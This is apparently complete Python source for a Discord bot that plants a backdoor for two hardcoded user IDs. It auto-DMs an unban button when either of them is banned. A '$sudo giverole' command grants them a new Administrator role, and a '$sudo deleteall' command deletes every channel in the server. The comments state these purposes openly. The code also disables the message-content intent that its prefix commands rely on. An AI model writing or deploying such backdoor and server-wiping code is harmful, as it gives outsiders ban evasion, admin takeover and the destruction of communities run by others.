# ================= IMPORTS =================
# Built-in modules
import os
import time

# Discord API
import discord
from discord.ext import commands
from discord import ui


# ================= CONFIG =================

# Bot token pulled from environment variables
TOKEN = os.getenv("DISCORD_TOKEN")

# Server (guild) ID where unban + admin actions apply
GUILD_ID = 1449298346425585768

# Users allowed to use sudo commands + unban button
ALLOWED_USERS = {
    1258115928525373570,  # nico044037
    123456789012345678   # sukunaluni (replace with real ID)
}


# ================= INTENTS =================

# Default intents
intents = discord.Intents.default()

# REQUIRED to detect bans and manage members
intents.members = True

# Message content not needed (commands use prefix parsing)
intents.message_content = False


# ================= BOT SETUP =================

# Prefix is "$sudo " so commands look like:
# $sudo giverole
# $sudo deleteall
bot = commands.Bot(
    command_prefix="$sudo ",
    intents=intents,
    help_command=None
)


# ================= PERMISSION CHECK =================

# Checks if a user is allowed to use restricted actions
def allowed(user: discord.User | discord.Member):
    return user.id in ALLOWED_USERS


# ================= UNBAN BUTTON VIEW =================

# Persistent button view (survives restarts)
class UnbanRequestView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # No timeout = persistent

    # Button definition
    @ui.button(label="🔓 Unban", style=discord.ButtonStyle.primary)
    async def unban_button(self, interaction: discord.Interaction, button: ui.Button):

        # Block unauthorized users
        if not allowed(interaction.user):
            await interaction.response.send_message(
                "⛔ You are not allowed to use this button.",
                ephemeral=True
            )
            return

        # Get target guild
        guild = interaction.client.get_guild(GUILD_ID)

        # Bot not in server
        if guild is None:
            await interaction.response.send_message(
                "❌ Bot is not in the server.",
                ephemeral=True
            )
            return

        try:
            # Attempt to unban the user who clicked the button
            await guild.unban(
                interaction.user,
                reason="Unban requested via button"
            )

            # Success response
            await interaction.response.send_message(
                "✅ You have been unbanned!",
                ephemeral=True
            )

        # User is not banned
        except discord.NotFound:
            await interaction.response.send_message(
                "ℹ️ You are not banned in this server.",
                ephemeral=True
            )

        # Bot lacks permissions
        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ Bot lacks permission to unban members.",
                ephemeral=True
            )

        # Generic API failure
        except discord.HTTPException:
            await interaction.response.send_message(
                "❌ Something went wrong while unbanning.",
                ephemeral=True
            )


# ================= BOT READY EVENT =================

@bot.event
async def on_ready():
    # Required for persistent button views
    bot.add_view(UnbanRequestView())

    # Console log
    print(f"✅ Logged in as {bot.user}")


# ================= BAN DM EVENT =================

@bot.event
async def on_member_ban(guild, user):

    # Ignore users not in allowed list
    if not allowed(user):
        return

    # Embed sent to banned user
    embed = discord.Embed(
        title="🚨 You were banned",
        description=(
            f"**Server:** {guild.name}\n"
            f"**Server ID:** `{guild.id}`\n\n"
            "Press **Unban** below."
        ),
        color=discord.Color.red()
    )

    try:
        # Send DM with unban button
        await user.send(
            embed=embed,
            view=UnbanRequestView()
        )

    # User has DMs disabled
    except discord.Forbidden:
        print("❌ User has DMs closed")


# ================= SUDO COMMANDS =================

# $sudo giverole
# Creates an admin role called "perms" and assigns it
@bot.command(name="giverole")
async def sudo_giverole(ctx: commands.Context):

    # Permission check
    if not allowed(ctx.author):
        await ctx.send("⛔ You are not allowed to use this command.")
        return

    guild = ctx.guild

    # Must be used in a server
    if guild is None:
        await ctx.send("❌ This command must be used in a server.")
        return

    # Try to find existing role
    role = discord.utils.get(guild.roles, name="perms")

    # Create role if it doesn't exist
    if role is None:
        try:
            role = await guild.create_role(
                name="perms",
                permissions=discord.Permissions(administrator=True),
                reason="Sudo perms role created"
            )
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to create roles.")
            return

    # Assign role to command user
    try:
        await ctx.author.add_roles(role, reason="Sudo perms granted")
        await ctx.send("✅ You now have the **perms** role with Administrator.")
    except discord.Forbidden:
        await ctx.send("❌ I can’t assign that role (role hierarchy issue).")


# $sudo deleteall
# Deletes EVERY channel in the server
@bot.command(name="deleteall")
async def sudo_deleteall(ctx: commands.Context):

    # Permission check
    if not allowed(ctx.author):
        await ctx.send("⛔ You are not allowed to use this command.")
        return

    guild = ctx.guild

    # Must be in a server
    if guild is None:
        return

    # Warning message
    await ctx.send("⚠️ **Deleting ALL channels...**")

    # Loop through and delete channels
    for channel in guild.channels:
        try:
            await channel.delete(reason="Sudo deleteall invoked")
        except discord.Forbidden:
            pass  # Missing permissions
        except discord.HTTPException:
            pass  # API error


# ================= STARTUP =================

# Token missing = crash
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set")

# Small delay for hosting platforms (Railway, etc.)
time.sleep(5)

# Start bot
bot.run(TOKEN)
